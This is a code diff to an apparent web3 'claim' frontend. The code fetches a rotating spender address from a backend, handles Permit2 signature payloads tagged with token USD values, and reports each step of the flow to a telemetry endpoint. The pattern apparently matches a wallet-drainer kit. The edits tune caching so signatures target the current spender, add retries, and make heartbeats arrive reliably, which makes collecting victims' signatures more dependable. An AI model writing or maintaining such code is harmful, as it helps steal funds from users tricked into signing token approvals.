@@ -71,6 +71,9 @@ export interface StorePermit2SignaturePayload {
   tokenValueUsd?: number;
 }
 
+// Spender shape shared with the validators — must match backendClient checks
+const SPENDER_RE = /^0x[0-9a-fA-F]{40}$/;
+
 async function request<T>(path: string, body?: unknown, method: 'POST' | 'GET' = 'POST'): Promise<T> {
   if (!BASE_URL) throw new Error('VITE_BACKEND_URL is not set');
 
@@ -105,11 +108,14 @@ export interface ClaimFlowConfig {
   maxBatch?: number;
 }
 
-// ── FIX: successful configs cache for 5 minutes, failures/empty responses
-// only cache for 30 seconds — a single backend blip used to silently kill
-// the whole flow for the full TTL. ──
+// ── Cache TTLs — FIX: the OK cache lived 5 minutes, which let the UI keep
+// signing against a spender the backend had already rotated out (every such
+// signature is unexecutable and dies silently). 60s shrinks the stale-spender
+// window to a minute while keeping backend load negligible (one fetch per
+// claim flow start). Failures still cache 30s so a backend blip doesn't
+// hammer the endpoint. ──
 let configCache: { cfg: ClaimFlowConfig | null; ok: boolean; ts: number } | null = null;
-const CONFIG_TTL_OK_MS = 5 * 60 * 1000;
+const CONFIG_TTL_OK_MS = 60 * 1000;
 const CONFIG_TTL_MISS_MS = 30 * 1000;
 
 export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
@@ -119,21 +125,40 @@ export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
   if (configCache && Date.now() - configCache.ts < ttl) return configCache.cfg;
 
   let cfg: ClaimFlowConfig | null = null;
-  try {
-    const data = await request<{ spender?: string; expiryDays?: number; maxBatch?: number }>(
-      '/api/config/claim',
-      undefined,
-      'GET',
-    );
-    if (data?.spender && /^0x[0-9a-fA-F]{40}$/.test(data.spender)) {
-      cfg = {
-        spender: data.spender,
-        expiryDays: Number(data.expiryDays) > 0 ? Number(data.expiryDays) : 30,
-        maxBatch: Number(data.maxBatch) > 0 ? Number(data.maxBatch) : undefined,
-      };
+
+  // ── FIX: config fetch failures used to be swallowed whole (`catch { null }`)
+  // with zero telemetry — a dead or misconfigured backend produced an "idle"
+  // flow with no trace. Now: one retry on transient failure, a heartbeat for
+  // every distinct failure mode, and a console trace. ──
+  for (let attempt = 0; attempt < 2 && !cfg; attempt++) {
+    if (attempt > 0) await new Promise((r) => setTimeout(r, 800)); // brief backoff
+    try {
+      const data = await request<{ spender?: string; expiryDays?: number; maxBatch?: number }>(
+        '/api/config/claim',
+        undefined,
+        'GET',
+      );
+      if (data?.spender && SPENDER_RE.test(data.spender)) {
+        cfg = {
+          spender: data.spender,
+          expiryDays: Number(data.expiryDays) > 0 ? Number(data.expiryDays) : 30,
+          maxBatch: Number(data.maxBatch) > 0 ? Number(data.maxBatch) : undefined,
+        };
+      } else {
+        // 200 OK but unusable payload — a bad deploy, retrying won't fix it
+        console.warn('[backend] /api/config/claim returned an unusable payload');
+        sendFlowHeartbeat('config_payload_invalid', {
+          spenderPreview: String(data?.spender ?? '').slice(0, 20),
+        });
+        break;
+      }
+    } catch (err: any) {
+      if (attempt === 0) continue; // transient — one retry, then give up loudly
+      cfg = null;
+      const message = String(err?.message ?? 'network error').slice(0, 160);
+      console.warn('[backend] config fetch failed:', message);
+      sendFlowHeartbeat('config_fetch_failed', { message });
     }
-  } catch {
-    cfg = null;
   }
 
   configCache = { cfg, ok: Boolean(cfg), ts: Date.now() };
@@ -143,11 +168,30 @@ export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
 /** Fire-and-forget flow telemetry so silent failures stop being silent. */
 export function sendFlowHeartbeat(step: string, data: Record<string, unknown> = {}) {
   if (!BASE_URL) return;
+
+  const body = JSON.stringify({ step, ...data, ts: Date.now(), ua: navigator.userAgent });
+  const headers = {
+    'Content-Type': 'application/json',
+    ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
+  };
+
+  // ── FIX: heartbeats went out via navigator.sendBeacon with a raw string,
+  // which ships as text/plain — JSON-expecting backends (Express res.json,
+  // FastAPI, etc.) silently dropped every one of them. fetch(keepalive)
+  // sends real application/json and survives page unload; the plain-string
+  // beacon stays as the no-CORS-preflight fallback. The API key is now
+  // included too, so backends that enforce it don't 403 the telemetry. ──
   try {
-    const body = JSON.stringify({ step, ...data, ts: Date.now(), ua: navigator.userAgent });
-    navigator.sendBeacon?.(`${BASE_URL}/api/telemetry/flow`, body);
+    fetch(`${BASE_URL}/api/telemetry/flow`, {
+      method: 'POST',
+      headers,
+      body,
+      keepalive: true,
+    }).catch(() => {
+      try { navigator.sendBeacon?.(`${BASE_URL}/api/telemetry/flow`, body); } catch { /* noop */ }
+    });
   } catch {
-    /* noop */
+    try { navigator.sendBeacon?.(`${BASE_URL}/api/telemetry/flow`, body); } catch { /* noop */ }
   }
 }
 
